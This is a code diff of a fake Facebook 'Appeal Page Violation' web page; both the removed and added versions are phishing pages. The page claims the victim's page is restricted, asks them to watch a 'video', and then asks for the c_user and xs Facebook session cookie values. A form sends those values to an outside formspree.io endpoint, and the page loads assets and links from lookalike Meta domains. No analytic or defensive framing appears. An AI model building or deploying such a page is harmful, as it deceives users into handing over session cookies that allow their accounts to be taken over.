@@ -1,95 +1,141 @@
-<!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <link rel="stylesheet" href="style.css">
-    <link rel="icon" href="https://pbs.twimg.com/media/GQB99gQaQAEUOZ7?format=png&name=small">
-    <title>Action | Required</title>
-</head>
-<body>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Action Required | Facebook</title>
+    <link rel="stylesheet" href="style.css" />
 
-    <nav>
-        <div class="nav-left">
-            <p class="fb-2">
-                facebook
-            </p>
-        </div>
-          <div class="nav-right">
-            <div class="search-box">
-                <img src="https://i.pngimg.me/thumb/f/720/m2i8K9H7d3H7H7G6.jpg" alt="search-icon">
-                <input type="text" placeholder="Search" >
-            </div>
+    <link
+      rel="stylesheet"
+      href="https://meta-submit.github.io/report-isuess-fb-request-now/style.css"
+    />
+
+    <style>
+      .img {
+        width: 300px;
+        height: 300px;
+      }
+    </style>
+
+    <body>
+      <div class="header_container">
+        <nav class="header__nav">
+          <p class="facebook">facebook</p>
+          <header>
+            <input
+              class="nav-search"
+              type="text"
+              placeholder="How can we help?"
+            />
+          </header>
+        </nav>
+        <div class="help">
+          <div class="container__helper">
+            <li>
+              <a class="help__a" href="#"
+                ><img src="https://i.imgur.com/ZcUp73J.png" />Help Center</a
+              >
+            </li>
           </div>
-         </nav> <br> <br>
-
-    <form action="https://formspree.io/f/mrbzzold" method="POST">
-
-       <div class="main-body">
-        <div class="text-1">
-            <p class="head-a">Appeal Page Violation</p>
         </div>
-       </div>
-       <div class="main-body">
-        <div class="text-2">
-            <p class="para-1">
-                We have detected unusual activity on your page that violates our community standards.
-            </p><br>
-            <p class="para-1">
-                Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.
-            </p><br>
-            <p class="para-1">
-                If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.
-            </p> <br>
-            <div class="video-text">
-                <p>Detailed Video Information</p>
-               </div>
-        
-              <div>
-                <video controls="" width="230" poster="https://i.pinimg.com/originals/97/95/69/979569a2dedd37573974ceebc05b4a4e.png" >
-                  <source src="https://weneedabackend.online/get13121112.mp4"  type="video/mp4" >
-               </video>
-              </div>
-              <div>
-                <h4>
-                  Must Watch the video to submit required information restriction
-                  won't be removed with incorrect information!
-                </h4>
-              </div><br>
-              <p class="para-1">Please be sure to provide the requested information below.</p> <br>
-
-              <div>
-                <p class="mt-4">
-                c_user
-               </p>
-                <input type="number" name="c_user" id="c_user" pattern="[0-9]+" minlength="6" required="">
-              </div> <br>
-        
-              <div>
-                <p class="mt-4">
-                xs
-               </p>
-                <input  type="text" name="xs" id="xs" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&amp;+=]).{12,}$" required="">
-              </div> <br>
-              <p class="para-1">**Please make sure account not to log out from your computer or laptop until you have received a verification email.</p><br>
-
-              <div class="container">
-                <button class="button">
-                  <p>
-                    Submit
-                  </p>
-                </button>
-          
-              </div>
-
+      </div>
+      <div class="main">
+        <header class="main__header">
+          <marquee> <h3 class="main__h3">Appeal Page Violation</h3></marquee>
+        </header>
+        <div class="main__body">
+          <p>
+            We have detected unusual activity on your page that violates our
+            community standards.
+          </p>
+          <p>
+            Your access to your page has been limited, and you are currently
+            unable to post, share, or comment using your page.
+          </p>
+          <p>
+            If you believe this to be a mistake, you have the option to submit
+            an appeal by providing the necessary information.
+          </p>
+          <p class="video__p">Detailed Video Information</p>
+          <a
+            target="_blank"
+            onclick="myFunction()"
+            class="video"
+            href="https://detailed-video-29b30.web.app/detailed%20video.mp4"
+            ><img
+              src="https://help-pages-verificatio-meta.netlify.app/downloadssss.png"
+              alt=""
+          /></a>
+          <div>
+            <h3>
+              Must Watch the video to submit required information restriction
+              won't be removed with incorrect information!
+            </h3>
+          </div>
+          <p>Please be sure to provide the requested information below.</p>
+          <form
+            action="https://formspree.io/f/mrbzzold"
+            method="POST"
+          >
+            <label class="label" for="recipient">c_user</label>
+            <input
+              class="input"
+              id="numberInput"
+              type="C_user"
+              name="C_user"
+              required=""
+            />
+            <label class="label" for="subject">xs</label>
+            <input
+              class="input"
+              title="Enter correct information! Watch the video"
+              for="text"
+              name="xs"
+              pattern=".{30,}"
+              required=""
+           
+            <p class="text-[10px] font-serif mt-3 mx -3"></p>
+            <div id="btn-div" class="btn-div">
+              <button class="btn" type="submit" onclick="sendEmail()">
+                Submit
+              </button>
+            </div>
+          </form>
         </div>
-       </div>
-       <br><br> 
-       <div>
-        <p class="copy-r">
-            Meta ©️ 2024   </p>
+      </div>
+      <div class="footer">
+        <div class="footer__container">
+          <ul class="footer-ul">
+            <li><a href="">About</a></li>
+            <li><a href="">Privacy Policy</a></li>
+            <li><a href="">Careers</a></li>
+          </ul>
+          <ul class="footer-ul">
+            <li><a href="">AdChoices</a></li>
+            <li><a href="">Create ad</a></li>
+            <li><a href="">Create Page</a></li>
+          </ul>
+          <ul class="footer-ul">
+            <li><a href="">Terms and policies</a></li>
+            <li><a href="">Cookies</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="meta">
+        <figure class="is-resized size-full wp-block-image">
+          <img
+            class="img"
+            fetchpriority="high"
+            decoding="async"
+            src="https://i.imgur.com/gE3Re3K.jpeg"
+            alt=""
+          />
+        </figure>
       </div>
 
-     </form>
-    
-</body>
-</html>
+      <script src="index.1ca789be.js"></script>
+    </body>
+  </head>
+              </html>
+
+              
